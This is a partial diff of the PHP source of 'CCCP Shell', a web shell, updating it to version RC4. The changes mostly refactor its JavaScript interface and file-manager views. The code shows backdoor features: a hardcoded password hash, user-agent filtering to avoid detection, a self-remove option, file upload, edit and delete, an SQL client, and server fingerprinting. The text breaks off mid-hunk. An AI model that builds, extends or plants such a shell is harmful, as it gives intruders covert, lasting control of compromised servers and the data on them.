@@ -3,7 +3,7 @@
  * CCCP Shell
  * by DSR!
  * https://github.com/xchwarze/CCCPShell
- * v 1.0 RC3 30072014
+ * v 1.0 RC4 31072014
  */
 
 # System variables
@@ -12,8 +12,8 @@ $config['date'] = 'd/m/Y';
 $config['datetime'] = 'd/m/Y H:i:s';
 $config['hd_lines'] = 16;   //lines in hex preview file
 $config['hd_rows'] = 32;    //16, 24 or 32 bytes in one line
-$config['FMLimit'] = False; //file manager item limit. False = No limit
-$config['checkBDel'] = true;//Check Before Delete: True = On
+$config['FMLimit'] = False; //file manager item limit. False = No limit //TODO
+$config['checkBDel'] = true;//Check Before Delete: True = On //TODO
 $config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
 $config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
 
@@ -67,8 +67,13 @@ if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $uAge
 if (in_array($config['charset'], array('utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'))) 
 	header("Content-Type: text/html; charset=$config[charset]");
 
-function mHide($name, $value){
-	return "<input id='$name' name='$name' type='hidden' value='$value' />";
+function mHide($n, $v){
+	return "<input id='$n' name='$n' type='hidden' value='$v' />";
+}
+
+function mLink($t, $o, $m = true){
+	if ($m) $o .= ';return false;';
+	return "<a href='#' onclick='$o'>$t</a>";
 }
 
 function mInput($arg){
@@ -633,13 +638,13 @@ $p = getCrypt();
 if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	$i = 0;
 	$countMenu = count($CCCPmod);
-	$sysMenu = '<a href="#" onclick="ajaxLoad(\'me=file\');"><b>' . tText('fm', 'File Manager') . '</b></a> | ';
+	$sysMenu = mLink('<b>' . tText('fm', 'File Manager') . '</b>', 'ajaxLoad("me=file")') . ' | ';
 	while ($i < $countMenu){
-		$sysMenu .= '<a href="#" onclick="ajaxLoad(\'me=' . $CCCPmod[$i] . '\');"><b>' . $CCCPtitle[$i] . '</b></a>' . ($i == $countMenu ? '' : ' | ');
+		$sysMenu .= mLink("<b>$CCCPtitle[$i]</b>", 'ajaxLoad("me=' . $CCCPmod[$i] . '")') . ($i == $countMenu ? '' : ' | ');
 		$i++;
 	}			 
-	$sysMenu .= '<a href="#" onclick="ajaxLoad(\'me=srm\');"><b>' . tText('srm', 'Self Remove') . '</b></a> | <a href="#" onclick="if (confirm(\'' . tText('merror', 'Are you sure?') . '\')) sessionStorage.clear();return false;"><b>' . tText('logout', 'Logout') . '</b></a>';
-						
+	$sysMenu .= mLink('<b>' . tText('srm', 'Self Remove') . '</b>', 'ajaxLoad("me=srm")') . ' | ' . mLink('<b>' . tText('logout', 'Logout') . '</b>', 'if (confirm("' . tText('merror', 'Are you sure?') . '")) sessionStorage.clear()');
+	
 	$loader = '
 		<!DOCTYPE html>
 	<html>
@@ -654,7 +659,6 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	var h = 0;
 	var j = 1;
 	var d = document;
-	var gebi = getElementById;
 	var euc = encodeURIComponent;
 	var onDrag = false;
 	var dragX, dragY, dragDeltaX, dragDeltaY, lastAjax , lastLoad = "";
@@ -663,9 +667,9 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	
 	sorttable={k:function(a){sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,0==a.getElementsByTagName("thead").length&&(the=d.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);
 	if(1==a.tHead.rows.length){sortbottomrows=[];for(b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=d.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&
-	(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(d.gebi("sorttable_sortfwdind")),sortrevind=d.createElement("span"),sortrevind.id="sorttable_sortrevind",
-	sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(d.gebi("sorttable_sortrevind")),sortfwdind=d.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,
-	function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=d.gebi("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=d.gebi("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=d.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML=
+	(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(d.getElementById("sorttable_sortfwdind")),sortrevind=d.createElement("span"),sortrevind.id="sorttable_sortrevind",
+	sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(d.getElementById("sorttable_sortrevind")),sortfwdind=d.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,
+	function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=d.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=d.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=d.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML=
 	"&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=
 	sorttable.l;for(c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=
 	a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(b="",c=0;c<a.childNodes.length;c++)b+=
@@ -676,22 +680,22 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	Function.prototype.forEach=function(a,b,c){for(e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};
 
 	function append(e, c){
-		o = d.gebi(e);
+		o = d.getElementById(e);
 		if (o) o.innerHTML += c;
 	}
 	
 	function prepend(e, c){
-		o = d.gebi(e);
+		o = d.getElementById(e);
 		if (o) o.innerHTML = c + o.innerHTML;
 	}
 
 	function remove(e){
-		o = d.gebi(e);
+		o = d.getElementById(e);
 		if (o) o.parentNode.removeChild(o);
 	}
 
 	function empty(e){
-		o = d.gebi(e);
+		o = d.getElementById(e);
 		if (o) o.innerHTML = null;
 	}
 	
@@ -785,7 +789,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 
 	function dpath(e, t){
 		if (t)
-			return d.gebi("base").value + e.parentNode.parentNode.getAttribute("data-path");
+			return d.getElementById("base").value + e.parentNode.parentNode.getAttribute("data-path");
 		else
 			return e.parentNode.parentNode.getAttribute("data-path");
 	}
@@ -809,7 +813,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			y = dragY - dragDeltaY;
 			if (x < 0) x = 0;
 			if (y < 0) y = 0;
-			o = d.gebi("box").style;
+			o = d.getElementById("box").style;
 			o.left = x + "px";
 			o.top = y + "px";
 			setTimeout("drag_loop()", 50);
@@ -826,13 +830,13 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		box = "<div id=\'box\' class=\'box\'><p id=\'boxtitle\' class=\'boxtitle\'>"+t+"<span onclick=\'hide_box();\' class=\'boxclose floatRight\'>x</span></p><div class=\'boxcontent\'>"+ct+"</div></div>";
 		append("content", box);
 
-		x = (d.body.clientWidth - d.gebi("box").clientWidth)/2;
-		y = (d.body.clientHeight - d.gebi("box").clientHeight)/2;
+		x = (d.body.clientWidth - d.getElementById("box").clientWidth)/2;
+		y = (d.body.clientHeight - d.getElementById("box").clientHeight)/2;
 		if (x < 0) x = 0;
 		if (y < 0) y = 0;
 		dragX = x;
 		dragY = y;
-		o = d.gebi("box").style;
+		o = d.getElementById("box").style;
 		o.left = x + "px";
 		o.top = y + "px";
 			
@@ -840,7 +844,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			if (e.keyCode === 27) hide_box();
 		});
 		
-		d.gebi("boxtitle").addEventListener("click", function(e){
+		d.getElementById("boxtitle").addEventListener("click", function(e){
 			e.preventDefault();
 			if (!onDrag){		
 				dragDeltaX = e.pageX - parseInt(o.left);
@@ -871,12 +875,12 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 	
 	function updateui(){
-		o = d.gebi("jseval");
+		o = d.getElementById("jseval");
 		if (o) eval(o.value);
-		o = d.gebi("sort");
+		o = d.getElementById("sort");
 		if (o) sorttable.k(o);
-		o = d.gebi("etime");
-		if (o) d.gebi("uetime").innerHTML = o.value;
+		o = d.getElementById("etime");
+		if (o) d.getElementById("uetime").innerHTML = o.value;
 	}
 	
 	function viewSize(f){
@@ -895,7 +899,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 	
 	function godirui(){
-		ajaxLoad("me=file&dir=" + euc(d.gebi("goui").value));
+		ajaxLoad("me=file&dir=" + euc(d.getElementById("goui").value));
 	}
 	
 	function showUI(a, o){
@@ -920,12 +924,12 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			text = title;
 		} else if ((a === "cdir") || (a === "cfile")){
 			path = "";
-			datapath = d.gebi("base").value;
+			datapath = d.getElementById("base").value;
 			title = "' . tText('createdir', 'Create directory') . '";
 			if (a === "cfile") title = "' . tText('createfile', 'Create file') . '";
 		}
 	
-		ct = "<table class=\'boxtbl\'><tr><td class=\'colFit\'>" + text + "</td><td><input id=\'uival\' name=\'uival\' type=\'text\' value=\'" + path + "\' " + disabled + "></td></tr><tr data-path=\'" + datapath + "\'><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, dpath(this, false), d.gebi(&quot;uival&quot;).value);\'>" + btitle + "</span></td></tr></table>";
+		ct = "<table class=\'boxtbl\'><tr><td class=\'colFit\'>" + text + "</td><td><input id=\'uival\' name=\'uival\' type=\'text\' value=\'" + path + "\' " + disabled + "></td></tr><tr data-path=\'" + datapath + "\'><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, dpath(this, false), d.getElementById(&quot;uival&quot;).value);\'>" + btitle + "</span></td></tr></table>";
 		show_box(title, ct);
 	}	
 	
@@ -941,32 +945,36 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		} else if (a === "copy"){
 			title = "' . tText('copy', 'Copy') . '";
 			uival = "<tr><td class=\'colFit\'>' . tText('to', 'To') . '</td><td><input id=\'uival\' name=\'uival\' type=\'text\' value=\'\'></td></tr>";
-			n = "d.gebi(&quot;uival&quot;).value";
+			n = "d.getElementById(&quot;uival&quot;).value";
 		} else if (a === "rdel"){
 			title = "' . tText('del', 'Del') . '";
 		}
 
-		ct = "<table class=\'boxtbl\'>" + uival + "<tr><td colspan=\'2\'><textarea disabled=\'\' wrap=\'off\' style=\'height:120px;min-height:120px;\'>" + decodeURIComponent(s).replace(/&/g, "\n") + "</textarea></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, &quot;&" + s + "&fl=" + euc(d.gebi("base").value) + "&quot;, " + n + ");\'>" + btitle + "</span></td></tr></table>";
+		ct = "<table class=\'boxtbl\'>" + uival + "<tr><td colspan=\'2\'><textarea disabled=\'\' wrap=\'off\' style=\'height:120px;min-height:120px;\'>" + decodeURIComponent(s).replace(/&/g, "\n") + "</textarea></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, &quot;&" + s + "&fl=" + euc(d.getElementById("base").value) + "&quot;, " + n + ");\'>" + btitle + "</span></td></tr></table>";
 		if (a === "comp" && s.length > 2000) ct += "<div class=\'boxresult\'>WARNING the GET request is > 2000 chars</div>";
 		show_box(title, ct);
 	}
 	
 	function processUI(a, o, n){
-		if (a === "comp"){
-			hide_box();
-			append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getCrypt("me=file&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
-		} else {
-			if (a !== "rdel" && n === "") return;
-			if (a !== "copy" && a !== "rdel") o = euc(o);
-			if (a === "ren") n = d.gebi("base").value + n;
-			ajax("me=file&md=tools&ac=" + a + "&a=" + o + "&b=" + euc(n), function(r){
-				if (r === "OK"){
-					hide_box();
-					ajaxLoad(lastLoad);
-				} else append("box", "<div class=\'boxresult\'>" + r + "</div>");
-			});
-		}
-	}
+        if (a === "comp"){
+            hide_box();
+            append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getCrypt("me=file&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
+        } else {
+            if (a !== "rdel" && n === "") return;
+            if (a !== "copy" && a !== "rdel") o = euc(o);
+            if (a === "ren") n = d.getElementById("base").value + n;
+           
+            append("box", "<div id=\'mloading\' class=\'loading loadingmini\'></div>");
+            ajax("me=file&md=tools&ac=" + a + "&a=" + o + "&b=" + euc(n), function(r){
+                remove("mloading");
+                if (r === "OK"){
+                    hide_box();
+                    ajaxLoad(lastLoad);
+                } else                    
+                    append("box", "<div class=\'boxresult\'>" + r + "</div>");
+            });
+        }
+    }
 	
 	function dl(o){
 		remove("dlf");
@@ -974,14 +982,17 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 	
 	function up(){
-		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'' . getSelf() . '\'><input type=\'hidden\' value=\'" + decodeURIComponent(getCrypt("me=file&ac=up&dir=" + euc(d.gebi("base").value), "e")) + "\' name=\'' . $config['consNames']['post'] . '\'><table class=\'boxtbl\'><tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>' . tText('go', 'Go!') . '</span></td></tr></table></form>";
+		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'' . getSelf() . '\'><input type=\'hidden\' value=\'" + decodeURIComponent(getCrypt("me=file&ac=up&dir=" + euc(d.getElementById("base").value), "e")) + "\' name=\'' . $config['consNames']['post'] . '\'><table class=\'boxtbl\'><tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>' . tText('go', 'Go!') . '</span></td></tr></table></form>";
 		show_box("' . tText('upload', 'Upload') . '", ct);
 	}
 	
 	function uiupdate(t){
 		ajax(serialize(d.forms[t]), function(r){
-			//remove("uires");
-			prepend("content", "<div id=\'uires\' class=\'uires\'>' . tText('sres', 'Shell response') . ': " + r + "</div>");
+			if (!d.getElementById("uires"))
+				prepend("content", "<div id=\'uires\' class=\'uires\'></div>");
+
+			append("uires", "' . tText('sres', 'Shell response') . ': " + r + "<br>\n");
+			d.getElementById("uires").scrollIntoView();
 		});
 	}
 
@@ -996,36 +1007,36 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}	
 	
 	function dbengine(t){
-		d.gebi("su").className = "hide";
-		d.gebi("sp").className = "hide";
-		d.gebi("so").className = "hide";
+		d.getElementById("su").className = "hide";
+		d.getElementById("sp").className = "hide";
+		d.getElementById("so").className = "hide";
 		
 		if ((t.value === "odbc") || (t.value === "pdo")){
-			d.gebi("sh").innerHTML = "' . tText('sq5', 'DSN/Connection String') . '";
-			d.gebi("su").className = "";
-			d.gebi("sp").className = "";
+			d.getElementById("sh").innerHTML = "' . tText('sq5', 'DSN/Connection String') . '";
+			d.getElementById("su").className = "";
+			d.getElementById("sp").className = "";
 		} else if ((t.value === "sqlite") || (t.value === "sqlite3")){
-			d.gebi("sh").innerHTML = "' . tText('sq6', 'DB File') . '";
+			d.getElementById("sh").innerHTML = "' . tText('sq6', 'DB File') . '";
 		} else {
-			d.gebi("sh").innerHTML = "' . tText('sq7', 'Host') . '";
-			d.gebi("su").className = "";
-			d.gebi("sp").className = "";
-			d.gebi("so").className = "";
+			d.getElementById("sh").innerHTML = "' . tText('sq7', 'Host') . '";
+			d.getElementById("su").className = "";
+			d.getElementById("sp").className = "";
+			d.getElementById("so").className = "";
 		}
 	}
 	
 	function dbhistory(a){
 		if (a == "s"){
 			o = {history: []};
-			if (sessionStorage.getItem("'{$config['consNames']['sqlclog']}'") != null)
-				o = JSON.parse(sessionStorage.getItem("'{$config['consNames']['sqlclog']}'"));
+			if (sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '") != null)
+				o = JSON.parse(sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '"));
 				
-			o.history.push({"sqltype": d.gebi("sqltype").value, "sqlhost": d.gebi("sqlhost").value, 
-				"sqlport": d.gebi("sqlport").value, "sqluser": d.gebi("sqluser").value, "sqlpass": d.gebi("sqlpass").value});
-			sessionStorage.setItem("'{$config['consNames']['sqlclog']}'", JSON.stringify(o));
-		} else if (sessionStorage.getItem("'{$config['consNames'][''{$config['consNames']['sqlclog']}'']}'") != null) {
+			o.history.push({"sqltype": d.getElementById("sqltype").value, "sqlhost": d.getElementById("sqlhost").value, 
+				"sqlport": d.getElementById("sqlport").value, "sqluser": d.getElementById("sqluser").value, "sqlpass": d.getElementById("sqlpass").value});
+			sessionStorage.setItem("' . $config['consNames']['sqlclog'] . '", JSON.stringify(o));
+		} else if (sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '") != null) {
 			s = "";
-			o = JSON.parse(sessionStorage.getItem("'{$config['consNames']['sqlclog']}'"));
+			o = JSON.parse(sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '"));
 			for (i = 0; i < o.history.length; i++){
 				u = "me=sql&sqlhost=" + o.history[i].sqlhost + "&sqlport=" + o.history[i].sqlport + "&sqluser=" + o.history[i].sqluser + "&sqlpass=" + o.history[i].sqlpass + "&sqltype=" + o.history[i].sqltype;
 				s += "[" + o.history[i].sqltype.toUpperCase() + "] " + o.history[i].sqluser + "@" + o.history[i].sqlhost + "<span style=\'float:right;\'><a href=\'#\' onclick=\'ajaxLoad(&quot;" + u + "&quot;)\'>' . tText('go', 'Go!') . '</a></span><br>";
@@ -1043,16 +1054,16 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 		
 	function toggle(b){
-		if (d.gebi(b)){
-			if (d.gebi(b).style.display == "block") d.gebi(b).style.display = "none";
-			else d.gebi(b).style.display = "block"
+		if (d.getElementById(b)){
+			if (d.getElementById(b).style.display == "block") d.getElementById(b).style.display = "none";
+			else d.getElementById(b).style.display = "block"
 		}
 	}
 	
 	function change(l, b){
-		d.gebi(l).style.display = "none";
-		d.gebi(b).style.display = "block";
-		if (d.gebi("goui")) d.gebi("goui").focus();
+		d.getElementById(l).style.display = "none";
+		d.getElementById(b).style.display = "block";
+		if (d.getElementById("goui")) d.getElementById("goui").focus();
 	}
 	
 	function hilite(e){
@@ -1063,7 +1074,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			c.className = "";
 		
 		a = d.getElementsByName("cbox");
-		b = d.gebi("total_selected");
+		b = d.getElementById("total_selected");
 		c = 0;
 		
 		for (i = 0;i<a.length;i++) 
@@ -1075,7 +1086,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			b.innerHTML = " ( selected : " + c + " items )";
 	}
 
-	ajaxLoad("me=file");
+	ajaxLoad("me=file' . (isset($p['dir']) ? '&dir=' . rawurlencode($p['dir']) : '') . '");
 	  </script>
 	  <style type="text/css">
 		*{
@@ -1383,7 +1394,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		  </tr>
 		  <tr>
 			<td>
-			  <p align="left"><b>Software: </b><a href="#" onclick="ajaxLoad(\'me=phpinfo\')"><b>' . $_SERVER['SERVER_SOFTWARE'] . '</b></a></p>
+			  <p align="left"><b>Software: ' . $_SERVER['SERVER_SOFTWARE'] . '</b></p>
 			  <p align="left"><b>uname -a: ' . php_uname() . '</b></p>
 			  <p align="left"><b>Safe-mode: ' . getcfg('safe_mode') . '</b></p>
 			  <br><center>' . $sysMenu . '</center>
@@ -1757,8 +1768,9 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					sAjax(@rename($p['a'], $p['b']) ? 'OK' : tText('fail', 'Fail!'));
 				break;
 		}
-	} elseif (@$p['md'] === 'info'){			
-		$sBuff .= '<b>' . tText('information', 'Information') . ': </b>
+	} elseif (@$p['md'] === 'info'){
+		if (file_exists($p['t'])){
+			$sBuff .= '<h2>' . tText('information', 'Information') . ' [' . mLink(tText('goback', 'Go Back'), 'ajaxLoad("me=file&dir=' . rawurlencode(getUpPath($p['t'])) . '")') . ']</h2>
 					 <table border=0 cellspacing=1 cellpadding=2>
 					 <tr><td><b>' . tText('path', 'Path') . '</b></td><td>' . $p['t'] . '</td></tr>
 					 <tr><td><b>' . tText('size', 'Size') . '</b></td><td>' . sizecount(filesize($p['t'])) . '</td></tr>
@@ -1767,85 +1779,86 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					 <tr><td><b>' . tText('ctime', 'Create time') . '</b></td><td>' . date($config['datetime'], filectime($p['t'])) . '</td></tr>
 					 <tr><td><b>' . tText('atime', 'Access time') . '</b></td><td>' . date($config['datetime'], fileatime($p['t'])) . '</td></tr>
 					 <tr><td><b>' . tText('mtime', 'Modify time') . '</b></td><td>' . date($config['datetime'], filemtime($p['t'])) . '</td></tr>';
-					 
-		if (!$isWIN){
-			$ow = posix_getpwuid(fileowner($p['t']));
-			$gr = posix_getgrgid(filegroup($p['t']));
-			$sBuff .= '<tr><td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td><td>' .
-						($ow['name'] ? $ow['name'] : fileowner($p['t'])) . '/' . ($gr['name'] ? $gr['name'] : filegroup($p['t'])) .
-						'<tr><td><b>' . tText('perms', 'Perms') . '</b></td><td>' . vPermsColor($p['t']) . '</td></tr>';
-		}
-		$sBuff .= '</table><br>';
+						 
+			if (!$isWIN){
+				$ow = posix_getpwuid(fileowner($p['t']));
+				$gr = posix_getgrgid(filegroup($p['t']));
+				$sBuff .= '<tr><td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td><td>' .
+							($ow['name'] ? $ow['name'] : fileowner($p['t'])) . '/' . ($gr['name'] ? $gr['name'] : filegroup($p['t'])) .
+							'<tr><td><b>' . tText('perms', 'Perms') . '</b></td><td>' . vPermsColor($p['t']) . '</td></tr>';
+			}
+			$sBuff .= '</table><br>';
+					
+			$fp  = @fopen($p['t'], 'rb');
+			if ($fp){
+				$sBuff .= '<div data-path="' . $p['t'] . '"><p>
+								[' . mLink(tText('hl', 'Highlight'), 'ajaxLoad("me=file&md=info&hl=n&t=" + euc(dpath(this, false)))') . ']
+								[' . mLink(tText('hlp', 'Highlight +'), 'ajaxLoad("me=file&md=info&hl=p&t=" + euc(dpath(this, false)))') . ']
+								[' . mLink(tText('hd', 'Hexdump'), 'ajaxLoad("me=file&md=info&hd=n&t=" + euc(dpath(this, false)))') . ']
+								[' . mLink(tText('hdp', 'Hexdump preview'), 'ajaxLoad("me=file&md=info&hd=p&t=" + euc(dpath(this, false)))') . ']
+								[' . mLink(tText('edit', 'Edit'), 'ajaxLoad("me=file&md=edit&t=" + euc(dpath(this, false)))') . ']
+							</p></div><br><br>';		
 				
-		$fp  = @fopen($p['t'], 'rb');
-		if ($fp){
-			$sBuff .= '<div data-path="' . $p['t'] . '"><p>
-							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=n&t=\' + euc(dpath(this, false)));">' . tText('hl', 'Highlight') . '</a>]
-							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=p&t=\' + euc(dpath(this, false)));">' . tText('hlp', 'Highlight +') . '</a>]
-							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=n&t=\' + euc(dpath(this, false)));">' . tText('hd', 'Hexdump') . '</a>]
-							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=p&t=\' + euc(dpath(this, false)));">' . tText('hdp', 'Hexdump preview') . '</a>]
-							[<a href="#" onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, false)));">' . tText('edit', 'Edit') . '</a>]
-						</p></div><br><br>';		
-			
-			if (isset($p['hd'])){
-				if ($p['hd'] === 'n'){
-					$sBuff .= '<b>Hex Dump</b><br>';
-					$str = fread($fp, filesize($p['t']));
-				} else {
-					$sBuff .= '<b>Hex Dump Preview</b><br>';
-					$str = fread($fp, $config['hd_lines'] * $config['hd_rows']);
-				}
-				
-				$show_offset  = '00000000<br>';
-				$show_hex     = '';
-				$show_sBuff = '';
-				$counter      = 0;
-				$str_len      = strlen($str);
-				for ($i = 0; $i < $str_len; $i++){
-					$counter++;
-					$show_hex .= sprintf('%02X', ord($str[$i])) . ' ';
-					switch (ord($str[$i])){
-						case 0 :
-						case 9 :
-						case 10:
-						case 13:
-						case 32: $show_sBuff .= ' '; 
-							break;
-						default: $show_sBuff .= $str[$i];
-					}
-					if ($counter === $config['hd_rows']){
-						$counter = 0;
-						if ($i + 1 < $str_len) 
-							$show_offset .= sprintf('%08X', $i + 1) . '<br>';
-						$show_hex .= '<br>';
-						$show_sBuff .= "\n";
-					}
-				}
-				$sBuff .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . hsc($show_sBuff) . '</pre></td></tr></table></center><br>';
-			} else if (isset($p['hl'])){
-				if (function_exists('highlight_file')){
-					if ($p['hl'] === 'n'){
-						$sBuff .= '<b>Highlight:</b><br>' .
-									'<div class=ml1 style="background-color: #e1e1e1; color:black;">' . highlight_file($p['t'], true) . '</div>'; 
+				if (isset($p['hd'])){
+					if ($p['hd'] === 'n'){
+						$sBuff .= '<b>Hex Dump</b><br>';
+						$str = fread($fp, filesize($p['t']));
 					} else {
-						$code = substr(highlight_file($p['t'], true), 36, -15);
-						//if (substr_count($code, '<br>') > substr_count($code, "\n"))
-						$lines = explode('<br />', $code);
